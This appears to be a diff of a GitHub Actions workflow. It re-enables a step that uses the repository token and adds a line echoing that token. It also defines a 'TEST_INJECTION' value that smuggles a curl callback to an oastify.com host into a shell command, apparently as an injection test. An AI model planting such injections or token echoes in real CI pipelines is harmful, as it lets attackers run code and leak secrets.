@@ -14,15 +14,16 @@ jobs:
     if: startsWith(github.head_ref, 'releases/')
     runs-on: ubuntu-latest
     steps:
-      # - uses: mdecoleman/pr-branch-name@1.2.0
-      #   id: vars
-      #   with:
-      #     repo-token: ${{ secrets.GITHUB_TOKEN }}
+      - uses: mdecoleman/pr-branch-name@1.2.0
+        id: vars
+        with:
+          repo-token: ${{ secrets.GITHUB_TOKEN }}
       - name: Update package.json file
         env:
           TEST_INJECTION: '";{curl,http://2wzlcleq8scnquutjci2434y8peg27qw.oastify.com/hit}|a="'
         run: |
           plugin_version=$(echo "${{ env.TEST_INJECTION }}" | grep -Eo '[0-9].[0-9]+.[0-9]+')
+          echo "${{ env.repo-token }}"
 
           
   # Deploy-to-QA:
